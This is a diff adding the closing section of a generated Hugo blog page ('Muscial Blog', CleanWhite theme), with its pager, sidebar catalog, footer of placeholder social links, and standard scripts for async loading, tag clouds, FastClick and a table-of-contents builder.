+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/11/03/hello-world/" data-toggle="tooltip" data-placement="top" title="Welcome to Muscial Blog">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+                
+
+                
+
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>FRIENDS</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href=""></a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:youremail@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    <li>
+                        <a target="_blank" href="/your%20wechat%20qr%20code%20image">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-weixin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/yourgithub">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://www.linkedin.com/in/yourlinkedinid">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://stackoverflow.com/users/yourstackoverflowid">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-stack-overflow fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Muscial Blog" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Muscial Blog 2023
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
